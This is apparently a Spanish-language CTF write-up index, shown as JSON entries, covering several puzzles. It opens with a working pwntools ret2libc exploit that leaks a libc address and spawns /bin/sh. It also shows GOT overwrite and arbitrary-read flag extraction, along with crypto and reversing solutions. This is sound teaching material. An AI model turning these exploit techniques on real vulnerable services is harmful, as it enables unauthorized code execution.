sys.argv[1], int(sys.argv[2]) return remote(host, port) def main(): p = get_process() offset = 136 junk = b'A' * offset payload = junk payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload += p64(elf.got.puts) payload += p64(elf.plt.puts) payload += p64(elf.symbols.main) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() puts_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') glibc.address = puts_addr - glibc.symbols.puts log.info(f'Glibc base address: {hex(glibc.address)}') payload = junk payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0]) payload += p64(next(glibc.search(b'/bin/sh'))) payload += p64(rop.find_gadget(['ret'])[0]) payload += p64(glibc.symbols.system) p.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\\n', payload) p.recvline() p.interactive() if __name__ == '__main__': main()  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/heres-a-libc/","section":"ctf","summary":"picoCTF 2021. 90 puntos. Binario de 64 bits. Buffer Overflow. Ret2Libc","time":7,"title":"Here's a LIBC"},{"contents":"El reto nos presenta a ROXy, una codificadora que se especializa en códigos secretos con cifrados cortos y difíciles de descrifrar.\nSe nos proporcionan estos valores en hexadecimal y sabemos que ella ha realizado algo para generar el código secreto:\n0xc4115 0x4cf8  De hecho, el nombre ROXy es una pista porque está utilizando cifrado XOR. Si operamos estos números utilizando XOR, obtenemos el código secreto:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0xc4115 ^ 0x4cf8) '0xc0ded'  Luego la flag es: CTFlearn{0xc0ded}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/hextraordinary/","section":"ctf","summary":"Cifrado XOR","time":0,"title":"Hextraordinary"},{"contents":"Se nos proporciona un binario llamado highlighter:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Si usamos Ghidra, veremos el siguiente código descompilado de la función main:\nintmain() { int__fd; longin_FS_OFFSET; undefined8 *where; undefined8 what; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); setbuf(stdin, (char*) 0x0); setbuf(stdout, (char*) 0x0); __fd =open(\"flag.txt\", 0); read(__fd, flag, 100); puts(\"Write what?\"); __isoc99_scanf(\"%ld%*c\", \u0026amp;what); puts(\"Where?\"); __isoc99_scanf(\"%ld%*c\", \u0026amp;where); *where =what; memset(flag, 0, 100); puts(\"Bye!\"); if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return0; }  Básicamente, tenemos una manera de escribir el valor que queramos en la dirección que indiquemos (esto se conoce como primitiva write-what-where o primitiva de escritura arbitraria). Para obtener la flag, hay que ver el uso de memset al final. Usando la primitiva de escritura arbitraria, podemos modificar la Tabla de Offsets Globales (GOT), de manera que memset apunte a puts en la Tabla de Enlaces a Procedimientos (PLT). De esta manera, haremos que el binario ejecute puts(flag, 0, 100) en lugar de memset(flag, 0, 10).\nPodemos encontrar los valores que necesitamos con pwntools:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import ELF \u0026gt;\u0026gt;\u0026gt; elf = ELF('highlighter', checksec=False) \u0026gt;\u0026gt;\u0026gt; elf.got.memset 4210736 \u0026gt;\u0026gt;\u0026gt; elf.plt.puts 4198564 \u0026gt;\u0026gt;\u0026gt; exit()  Vamos allá (nótese que hay que poner los valores en formato decimal):\n$ nc chal.imaginaryctf.org 8091 Write what? 4198564 Where? 4210736 ictf{writing_is_hard_but_satisfying_sometimes} Bye!  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/highlighter/","section":"ctf","summary":"ImaginaryCTF 06/09/2022. 50 puntos. Binario de 64 bits. Primitiva de escritura arbitraria","time":1,"title":"Highlighter"},{"contents":"Se nos proporciona un binario llamado highlights:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Si usamos Ghidra, veremos el siguiente código descompilado de la función main:\nintmain() { undefined8 *address; FILE *fp;  setbuf(stdout, (char*) 0x0); setbuf(stdin, (char*) 0x0); fp =fopen(\"./flag.txt\", \"r\"); __isoc99_fscanf(fp, \"%s\", flag); printf(\"What address (in hex) would you like to read?\\n\u0026gt;\u0026gt;\u0026gt; \"); __isoc99_scanf(\"%lx%c\", \u0026amp;address, \u0026amp;dead); printf(\"Value at 0x%x: %016lx\\n\", address, *address); return0; }  Básicamente, tenemos una manera de leer el valor almacenado en la dirección que especifiquemos (esto es una primitiva de lectura arbitraria). En Ghidra, podemos encontrar la dirección de flag (que es una variable global). También podemos encontrarla con readelf (0x404080):\n$ readelf -s highlights | grep flag 70: 0000000000404080 128 OBJECT GLOBAL DEFAULT 25 flag  Pues, vamos a extraer la flag:\n$ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404080 Value at 0x404080: 6c6e6f7b66746369 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404088 Value at 0x404088: 5f6c6c696b735f79 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404090 Value at 0x404090: 706d695f65726f6d $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x404098 Value at 0x404098: 745f746e6174726f $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x4040a0 Value at 0x4040a0: 646165725f6e6168 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x4040a8 Value at 0x4040a8: 675f73695f676e69 $ nc puzzler7.imaginaryctf.org 5000 What address (in hex) would you like to read? \u0026gt;\u0026gt;\u0026gt; 0x4040b0 Value at 0x4040b0: 7d676e696c676f6f  Nótese que he parado al ver 7d (} como byte), ya que representa el final de la flag. Ahora solo tenemos que juntar todos los valores hexadecimales y representarlos en formato little-endian como bytes:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import p64 \u0026gt;\u0026gt;\u0026gt; b''.join(map(lambda x: p64(int(x, 16)), ['6c6e6f7b66746369', '5f6c6c696b735f79', '706d695f65726f6d', '745f746e6174726f', '646165725f6e6168', '675f73695f676e69', '7d676e696c676f6f'])) b'ictf{only_skill_more_important_than_reading_is_googling}'  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/highlights/","section":"ctf","summary":"ImaginaryCTF 05/09/2022. 50 puntos. Binario de 64 bits. Primitiva de lectura arbitraria","time":1,"title":"Highlights"},{"contents":"Se nos proporciona un código JavaScript ofuscado llamado good-luck.js. Al ejecutarlo en un documento HTML sencillo, muestra una ventana para validar la flag:\n\u0026lt;!doctypehtml\u0026gt; \u0026lt;htmllang=\"en\"\u0026gt; \u0026lt;head\u0026gt; \u0026lt;metacharset=\"UTF-8\"\u0026gt; \u0026lt;title\u0026gt;Hope you know JS\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;scriptsrc=\"good-luck.js\"\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  Haciendo uso del formateador Prettier en Visual Studio Code, pude encontrar patrones que se repetían a lo largo del código. Por ejemplo, empezé a sustituir expresiones como +!![] o ![] por sus valores finales.\nLuego, vi que una función devolvía nombres de métodos como join o length, por lo que modifiqué todas las ocurrencias.\nAdemás, había muchas llamadas a parseInt de la siguiente forma: parseInt(['1', '0', '0']['join]('')), que simplemente resulta en 100.\nEntonces, después de desofuscar el código hasta este punto, identifiquñe la función que validaba la flag (checker):\nletinput=prompt('Please enter your flag', 'Flag') functioncheck(my_input) { return( xde0152f8b3a135c172f6( single_checker(my_input, 0), single_checker(my_input, 1), single_checker(my_input, 2), single_checker(my_input, 3), single_checker(my_input, 4) ) \u0026amp; x923712f54875a51642ea( single_checker(my_input, 5), single_checker(my_input, 6), single_checker(my_input, 7), single_checker(my_input, 8), single_checker(my_input, 9) ) \u0026amp; xaa7b418e981417c0d7e7( single_checker(my_input, 10), single_checker(my_input, 11), single_checker(my_input, 12), single_checker(my_input, 13), single_checker(my_input, 14) ) \u0026amp; // ... x437dc67f1c57b9b1fbfe( single_checker(my_input, 240), single_checker(my_input, 241), single_checker(my_input, 242), single_checker(my_input, 243), single_checker(my_input, 244) ) \u0026amp; xef0469cb269181c1465d( single_checker(my_input, 245), single_checker(my_input, 246), single_checker(my_input, 247), single_checker(my_input, 248), single_checker(my_input, 249) ) ) } check(input) ?console.log('Congrats!') :console.log('Nope :(')  La función llamada single_checker retorna el carácter de my_input en función del número como segundo argumento:\nfunctionsingle_checker(my_input, number) { varindex=0 return( number%0==0\u0026amp;\u0026amp;(x479fa79c4c78b87bf320+=1), number%1==0\u0026amp;\u0026amp;(x24535896a451975e1ead+=1), number%2==0\u0026amp;\u0026amp;(x074117e2c33f667271a2+=1), number%3==0\u0026amp;\u0026amp;(xcdbf3860ed96def693b7+=1), number%4==0\u0026amp;\u0026amp;(x4bae623cbbe71530669c+=1), number%5==0\u0026amp;\u0026amp;(x2fa109dc60f6e5790e5f+=1), number%6==0\u0026amp;\u0026amp;(x0bac59156678535dce64+=1), number%7==0\u0026amp;\u0026amp;(xd1fc6501f139a65febe9+=1), number%8==0\u0026amp;\u0026amp;(x0266c50a73cb1a166c33+=1), number%9==0\u0026amp;\u0026amp;(x9341682b6b6f842b3aef+=1), number%40==0\u0026amp;\u0026amp;(x65a3b4441948a4006f8b+=1), x2fa109dc60f6e5790e5f==6\u0026amp;\u0026amp;((index=(number-20) *6), (index/=2)), number\u0026gt;=30\u0026amp;\u0026amp;number\u0026lt;=34\u0026amp;\u0026amp;(index=number), x65a3b4441948a4006f8b==2\u0026amp;\u0026amp; !x8dd0f0ac7f6bf83c1f50\u0026amp;\u0026amp; (x8dd0f0ac7f6bf83c1f50=true), x8dd0f0ac7f6bf83c1f50\u0026amp;\u0026amp; (number==44\u0026amp;\u0026amp;(x8dd0f0ac7f6bf83c1f50=false), (index=number-40), (index*=3), (x65a3b4441948a4006f8b=100)), number==185\u0026amp;\u0026amp;(index=number-180+8), number==186\u0026amp;\u0026amp;(index=number-180+8), number==187\u0026amp;\u0026amp;(index=-(number-180) +8), number==188\u0026amp;\u0026amp;(index=number-180+8), number==189\u0026amp;\u0026amp;(index=number-180+8), number==2\u0026amp;\u0026amp;(index=2), number==4\u0026amp;\u0026amp;(index=8), number==5\u0026amp;\u0026amp;(index=35), // ... number==242\u0026amp;\u0026amp;(index=28), number==243\u0026amp;\u0026amp;(index=36), my_input[index].charCodeAt(0) ) }  En checker, hay un montón de funciones diferentes que toman 5 valores como argumentos. Estos valores son siempre single_checker(my_input, x) hasta single_checker(my_input, x + 4). Todas las funciones de este tipo utilizan parámetros específicos. Por ejemplo, xde0152f8b3a135c172f6:\nfunctionxde0152f8b3a135c172f6( _0x14e395, _0xb878fb, _0x45c9e7, _0x1145fd, _0x2a1381 ) { var_0x30612b=_0x45c9e7*_0x2a1381==2600 return_0x30612b }  Esta solamente usa el tercer parámetro y el quinto parámetro. Recordemos que el valor de estos parámetros es un carácter de la flag en un índice concreto como número ASCII.\nEntonces, nos quedamos con un conjunto de condiciones entre caracteres de la flag que tienen que cumplirse para validar la flag.\nLa manera en la que escribí las condiciones puede que no sea eficiente. Utilicé el depurador de Firefox poniendo breakpoints en las instrucciones return de todas las funciones de condición. Luego, metí una cadena de 156 caracteres ASCII ordenados, de manera que los parámetros de la función coinciden con el índice:\n$ node Welcome to Node.js v18.10.0. Type \".help\" for more information. \u0026gt; Array.from(Array(256).keys()) [ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, ... 156 more items ] \u0026gt; Array.from(Array(256).keys()).map(n =\u0026gt; String.fromCharCode(n)[0]).join('') '\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\b\\t\\n' + '\\x0B\\f\\r\\x0E\\x0F\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1A\\x1B\\x1C\\x1D\\x1E\\x1F !\"#$%\u0026\\'()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\\x7F\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8A\\x8B\\x8C\\x8D\\x8E\\x8F\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9A\\x9B\\x9C\\x9D\\x9E\\x9F ¡¢£¤¥¦§¨©ª«¬®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ'  Aunque las condiciones se pueden resolver de forma manual, se puede usar el solucionador z3 para obtener una flag que se valide correctamente. Estas eran las condiciones:\ns.add(a[2] *a[8] ==2600) s.add(a[35] -a[39] ==-1) s.add(a[19] +a[37] ==149) s.add(a[20] +a[25] ==200) s.add(a[4] -a[7] ==-49) s.add(a[15] +a[24] -a[27] ==54) s.add(a[18] +a[21] +a[24] -a[27] ==106) s.add(a[30] +a[31] -a[32] +a[33] -a[34] ==48) s.add(a[0] +a[28] ==153) s.add(a[0] -a[6] ==-3) s.add(a[3] +a[9] ==99) s.add(a[3] *a[9] *a[12] ==134640) s.add(a[5] -a[23] ==47) s.add(a[29] +a[36] ==148) s.add(a[10] -a[38] ==50) s.add(a[11] +a[26] ==147) s.add(a[0] +a[22] ==99) s.add(a[4] +a[39] ==103) s.add(a[7] +a[25] ==199) s.add(a[28] -a[37] ==1) s.add(a[11] +a[29] ==146) s.add(a[5] -a[20] ==2) s.add(a[8] +a[38] ==102) s.add(a[19] -a[35] ==-5) s.add(a[19] +a[35] ==101) s.add(a[23] +a[36] ==105) s.add(a[22] -a[26] ==-50) s.add(a[13] +a[19] ==98) s.add(a[5] -a[30] ==4) s.add(a[17] -a[26] ==-50) s.add(a[1] -a[35] ==-2) s.add(a[11] -a[27] ==-3) s.add(a[32] +a[39] ==156) s.add(a[8] +a[14] ==99) s.add(a[10] -a[16] ==2) s.add(a[7] +a[31] ==150) s.add(a[4] -a[33] ==-5) s.add(a[2] -a[34] ==-1) s.add(a[15] +a[20] ==154) s.add(a[18] -a[37] ==-45) s.add(a[1] +a[13] +a[14] +a[16] +a[17] ==298) s.add(a[21] -a[38] ==-1) s.add(a[0] -a[24] ==0) s.add(a[19] +a[25] -a[36] ==98) s.add(-a[0] +a[28] +a[29] ==148) s.add(-a[4] +a[22] +a[23] ==53) s.add(a[2] +a[5] -a[35] ==100) s.add(a[7] +a[20] -a[29] ==100) s.add(a[10] +a[11] -a[26] ==53) s.add(a[8] +a[23] -a[38] ==52) s.add(a[22] +a[37] -a[39] ==95) s.add(a[25] +a[28] -a[36] ==152)  Ahora, vamos a resolverlo:\n$ python3 solve.py 33431e6b20f17217d080c3063eb4faa4f6553e46  Aunque se validaba correctamente por good-luck.js (el código original), no era la flag correcta. El problema es que hay dos posibles soluciones debido a estas condiciones:\ns.add(a[3] +a[9] ==99) s.add(a[3] *a[9] *a[12] ==134640)  Los caracteres a[3] y a[9] solamente se involucran en las condiciones anteriores. Como la suma y la multiplicación son conmutativas, los valores de a[3] y a[9] son intercambiables.\nEntonces, la flag correcta era 96:21:33401e6b23f17217d080c3063eb4faa4f6553e46.\nEl script completo se puede encontrar aquí solve.py.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/other/hope-you-know-js/","section":"ctf","summary":"BlackHat MEA CTF 2022. Desofuscación de JavaScript. Solucionador z3","time":3,"title":"Hope you know JS"},{"contents":"Se nos proporciona un código en Python para cifrar la flag (source.py), y también tenemos dialog.txt y encrypted_messages.txt:\nimportos withopen('super_secret_messages.txt', 'r') asf: SUPER_SECRET_MESSAGES=[msg.strip() formsginf.readlines()] defderiveKey(key): derived_key=[] fori, charinenumerate(key): previous_letters=key[:i] new_number=1 forj, previous_charinenumerate(previous_letters): ifprevious_char\u0026gt;char: derived_key[j] +=1 else: new_number+=1 derived_key.append(new_number) returnderived_key deftranspose(array): return[rowforrowinmap(list, zip(*array))] defflatten(array): return\"\".join([iforsubinarrayforiinsub]) deftwistedColumnarEncrypt(pt, key): derived_key=deriveKey(key) width=len(key) blocks=[pt[i:i+width] foriinrange(0, len(pt), width)] blocks=transpose(blocks) ct=[blocks[derived_key.index(i+1)][::-1] foriinrange(width)] ct=flatten(ct) returnct classPRNG: def__init__(self, seed): self.p=0x2ea250216d705 self.a=self.p self.b=int.from_bytes(os.urandom(16), 'big') self.rn=seed defnext(self): self.rn=((self.a*self.rn) +self.b) %self.p returnself.rn defmain(): seed=int.from_bytes(os.urandom(16), 'big') rng=PRNG(seed) cts=\"\" formessageinSUPER_SECRET_MESSAGES: key=str(rng.next()) ct=twistedColumnarEncrypt(message, key) cts+=ct+\"\\n\" withopen('encrypted_messages.txt', 'w') asf: f.write(cts) dialog=\"Miyuki says:\\n\" dialog+=\"Klaus it's your time to sign!\\n\" dialog+=\"All we have is the last key of this wierd encryption scheme.\\n\" dialog+=\"Please do your magic, we need to gather more information if we want to defeat Draeger.\\n\" dialog+=f\"The key is: {str(key)}\\n\" withopen('dialog.txt', 'w') asf: f.write(dialog) if__name__=='__main__': main()  Miyuki says: Klaus it's your time to sign! All we have is the last key of this wierd encryption scheme. Please do your magic, we need to gather more information if we want to defeat Draeger. The key is: 148823505998502  ETYDEDTYAATOSTTUFTEETHIVHMVOSFNANDHEGIIIOCESTHTCHDHNRNYALSRPDAIRDCEEIFREEEEOETLRTRNLEEUNBEOIPYLTNOVEOAOTN EECNEMOTCYSSSEORIRCETFDUCEDAATAPATWTTSKTTRROCEANHHHAIHOGPTTGROIEETURAFYUIPUEEONOISECNJISAFALRIUAVSAAVPDES GTNOERUTOIAOTIGRESHHBTSEHLORSRSSNTWINTEAUEENTAEEENOICCAFOSHDORLUFHRIALNGOYPNCEIGTAYAPETHCEOUATEFISTFBPSVK SNUTCAGPEEPWLHITEDFNDMPNWSHFORSLEOAIPTAPEOOOAOTGOSESNADRITRAEREOSSNPECUHSNHENSAATETTPSIUIUOOHPNSKTNIRYHFT WFAFDDSGIMMYTADNHRENINONSRSUMNITAHIANSUOEMAAEDAIFLOTFINEAYNEGYSNKROEOGFTCTNLYIIOODLOIRERVTAROTRROUNUTFAUP  La idea aquí es programar el algoritmo inverso, vamos a ver qué es lo que hace:\n Genera una semilla con un Generador de Números Pseudo-Aleatorios (Pseudo Random Number Generator, PRNG) y utiliza la siguiente iteración como clave para el algoritmo de cifrado Deriva una clave utilizando una función deriveKey Separa el mensaje en bloques de la misma anchura Transpone los bloques (es decir, [[1, 2], [3, 4]] se transforma en [[1, 3], [2, 4]]) Luego coge cada elemento de la clave derivada para ordenar los bloques y revertir cada bloque Finalmente, elimina los bloques con la función flatten (o sea, que [[1, 2], [3, 4]] se transforma en [1, 2, 3, 4])  Vamos a comenzar por analizar la implementación de PRNG:\nclassPRNG: def__init__(self, seed): self.p=0x2ea250216d705 self.a=self.p self.b=int.from_bytes(os.urandom(16), 'big') self.rn=seed defnext(self): self.rn=((self.a*self.rn) +self.b) %self.p returnself.rn  La función next está mal hecha, ya que ((self.a * self.rn) + self.b) % self.p es lo mismo que self.b % self.p, y self.b tiene un valor fijo. Por tanto, next siempre devuelve el mismo valor, y tenemos este valor en dialog.txt: 148823505998502.\nAhora, tenemos que invertir el algoritmo de cifrado de twistedColumnarEncrypt:\ndeftwistedColumnarEncrypt(pt, key): derived_key=deriveKey(key) width=len(key) blocks=[pt[i:i+width] foriinrange(0, len(pt), width)] blocks=transpose(blocks) ct=[blocks[derived_key.index(i+1)][::-1] foriinrange(width)] ct=flatten(ct) returnct  Como sabemos la clave, que es siempre la misma, la clave derivada también será siemre la misma. Por tanto, la anchura de los bloques es constante, por lo que podemos empezar separando el texto cifrado en bloques:\ndeftwisted_columnar_decrypt(ct, key): derived_key=derive_key(key) width=len(key) length=len(ct) //len(key) blocks=[list(ct[i:i+length]) foriinrange(0, len(ct), length)]  Nótese que length no es width, debido a la transposición. La relación entre width y length es: len(ct) = length * width.\nAhora, tenemos que asignar el texto claro en el índice de la clave derivada, el bloque correspondiente invertido. Puede ser un poco confuso, pero es solo la operación inversa. Finalmente, hay que transponer los bloques y eliminarlos con flatten:\ndeftwisted_columnar_decrypt(ct, key): derived_key=derive_key(key) width=len(key) length=len(ct) //len(key) blocks=[list(ct[i:i+length]) foriinrange(0, len(ct), length)] pt=blocks.copy() foriinrange(width): pt[derived_key.index(i+1)] =blocks[i][::-1] pt=transpose(pt) pt=flatten(pt) returnpt  Solo tenemos que leer los archivos proporcionados y realizar el descifrado. Este es el texto claro:\n$ python3 solve.py THELOCATIONOFTHECONVOYDANTEISDETERMINEDTOBEONTHETHIRDPLANETAFTERVINYRYOUCANUSELIGHTSPEEDAFTERTHEDELIVERYS THECARGOISSAFEWENEEDTOMOVEFASTCAUSETHERADARSAREPICKINGUPSUSPICIOUSACTIVITYAROUNDTHETRAJECTORYOFTHEPLANETA BECAREFULSKOLIWHENYOUARRIVEATTHEPALACEOFSCIONSAYTHECODEPHRASETOGETINHTBTHISRNGISNOTSAFEFORGENETINGOUTPUTS DONTFORGETTOCHANGETHEDARKFUELOFTHESPACESHIPWEDONTWANTANYUNPLEASANTSURPRISESTOHAPPENTHISSERIOUSMISSIONPOPO IFYOUMESSUPAGAINILLSENDYOUTOTHEANDROIDGRAVEYARDTOSUFFERFROMTHECONSTANTTERMINATIONOFYOURKINDAFINALWARNINGM $ python3 solve.py | grep -E HTB.+ BECAREFULSKOLIWHENYOUARRIVEATTHEPALACEOFSCIONSAYTHECODEPHRASETOGETINHTBTHISRNGISNOTSAFEFORGENETINGOUTPUTS  Por lo que la flag es: HTB{THISRNGISNOTSAFEFORGENETINGOUTPUTS}.\nEl script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/how-the-columns-have-turned/","section":"ctf","summary":"Algoritmo de cifrado inverso","time":2,"title":"How The Columns Have Turned"},{"contents":"Se nos proporciona este texto con solo letras A y B:\nABAAAABABAABBABBAABBAABAAAAAABAAAAAAAABAABBABABBAAAAABBABBABABBAABAABABABBAABBABBAABB  El reto dice que huele a bacon. De hecho, existe el Cifrado Bacon y podemos usarlo para descifrar el texto en CyberChef:\nY la flag es: CTFlearn{ILOUEBACONDONTYOU}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/hyperstream-test-2/","section":"ctf","summary":"Cifrado Bacon","time":0,"title":"HyperStream Test #2"},{"contents":" getProblemPdf('es', '1999', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-1999/","section":"imc","summary":null,"time":0,"title":"IMC 1999, Problema 1"},{"contents":" getProblemPdf('es', '1999', '7') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-7-1999/","section":"imc","summary":null,"time":0,"title":"IMC 1999, Problema 7"},{"contents":" getProblemPdf('es', '2000', '3') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-3-2000/","section":"imc","summary":null,"time":0,"title":"IMC 2000, Problema 3"},{"contents":" getProblemPdf('es', '2004', '7') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-7-2004/","section":"imc","summary":null,"time":0,"title":"IMC 2004, Problema 7"},{"contents":" getProblemPdf('es', '2004', '8') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-8-2004/","section":"imc","summary":null,"time":0,"title":"IMC 2004, Problema 8"},{"contents":" getProblemPdf('es', '2005', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2005/","section":"imc","summary":null,"time":0,"title":"IMC 2005, Problema 1"},{"contents":" getProblemPdf('es', '2005', '8') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-8-2005/","section":"imc","summary":null,"time":0,"title":"IMC 2005, Problema 8"},{"contents":" getProblemPdf('es', '2006', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2006/","section":"imc","summary":null,"time":0,"title":"IMC 2006, Problema 1"},{"contents":" getProblemPdf('es', '2007', '7') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-7-2007/","section":"imc","summary":null,"time":0,"title":"IMC 2007, Problema 7"},{"contents":" getProblemPdf('es', '2010', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2010/","section":"imc","summary":null,"time":0,"title":"IMC 2010, Problema 1"},{"contents":" getProblemPdf('es', '2012', '2') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-2-2012/","section":"imc","summary":null,"time":0,"title":"IMC 2012, Problema 2"},{"contents":" getProblemPdf('es', '2013', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2013/","section":"imc","summary":null,"time":0,"title":"IMC 2013, Problema 1"},{"contents":" getProblemPdf('es', '2013', '6') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-6-2013/","section":"imc","summary":null,"time":0,"title":"IMC 2013, Problema 6"},{"contents":" getProblemPdf('es', '2017', '6') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-6-2017/","section":"imc","summary":null,"time":0,"title":"IMC 2017, Problema 6"},{"contents":" getProblemPdf('es', '2018', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2018/","section":"imc","summary":null,"time":0,"title":"IMC 2018, Problema 1"},{"contents":" getProblemPdf('es', '2019', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2019/","section":"imc","summary":null,"time":0,"title":"IMC 2019, Problema 1"},{"contents":" getProblemPdf('es', '2019', '2') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-2-2019/","section":"imc","summary":null,"time":0,"title":"IMC 2019, Problema 2"},{"contents":" getProblemPdf('es', '2019', '5') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-5-2019/","section":"imc","summary":null,"time":0,"title":"IMC 2019, Problema 5"},{"contents":" getProblemPdf('es', '2019', '7') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-7-2019/","section":"imc","summary":null,"time":0,"title":"IMC 2019, Problema 7"},{"contents":" getProblemPdf('es', '2020', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2020/","section":"imc","summary":null,"time":0,"title":"IMC 2020, Problema 1"},{"contents":" getProblemPdf('es', '2020', '2') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-2-2020/","section":"imc","summary":null,"time":0,"title":"IMC 2020, Problema 2"},{"contents":" getProblemPdf('es', '2021', '1') ","image":null,"permalink":"https://7rocky.github.io/imc/problem-1-2021/","section":"imc","summary":null,"time":0,"title":"IMC 2021, Problema 1"},{"contents":"Se nos proporciona un código en Python que implementa RSA de forma extraña (fastprimes.py):\n#!/usr/bin/env python #********************************************************************** # filename: fasterprimes.py # version: 0.06.2-alpha # release date: 20170806 # dev: Cayce Pollard # qa: NOT PASSED, open defects. # finds a specified length prime, then a neighbouring prime for speed.  # DEFECTS # ID[243], category A4, owner: CayceP, comment: may have to be run several times to generate valid RSA values # ID[552], category A9, owner: AppSec, comment: Doneighbouring primes present a security risk? #********************************************************************** fromCrypto.Utilimportnumber fromCrypto.PublicKey.RSAimportconstruct fromCrypto.PublicKeyimportRSA importsympy defegcd(a, b): ifa==0: return(b, 0, 1) else: g, x, y=egcd(b%a, a) return(g, y-(b//a) *x, x) defgetPQ(): n_length=512#generates a 1024 bit key. whileTrue: firstprime=number.getPrime(n_length) #let's get our first number lowerp=firstprime-10 upperp=firstprime+10 forxinrange(lowerp,upperp): #getPrime takes too long so we'll find a nearby prime for q ifx==firstprime: continue else:  ifsympy.isprime(x): secondprime=x returnfirstprime, secondprime break return1, 1  e=65537 whileTrue: p, q=getPQ()  ifp==1: print(\"still trying\") else: break n=p*q#we make our modulus phi=(p-1)*(q-1) #this one is for making the private key gcd, d, b=egcd(e, phi) #now we have all our RSA values.  key_params=(long(n), long(e), long(d)) key=RSA.construct(key_params) printkey.exportKey() printkey.publickey().exportKey() #keep the pre-shared key below 100 bytes.  message=#put the message here. #message = [ord(c) for c in message] #comment out if message is int. #message = int(''.join(map(str,message))) print('message: ', message) RSAsecret=key.encrypt(int(message),'') #check the encryption works  print('RSAsecret: ', RSAsecret) #send this to the recipient print('message: ', message) #don't send this you idiot. print('Secret check:', key.decrypt(RSAsecret)) #check the message matches the decrypted message/  También tenemos el código que genera una clave de 128 bits (16 bytes) para AES (AESbootstrap.py):\n#!/usr/bin/env python #********************************************************************** # filename: AESbootstrap.py # version: 0.11.7-alpha # release date: 20170801 # dev: Cayce Pollard # qa: Jonathan Norrell # instantiate mersenne each time, feed it every 3 digits of the shared secret # to establish a shared AES128 key. # #********************************************************************** #textbook mersenne twister from 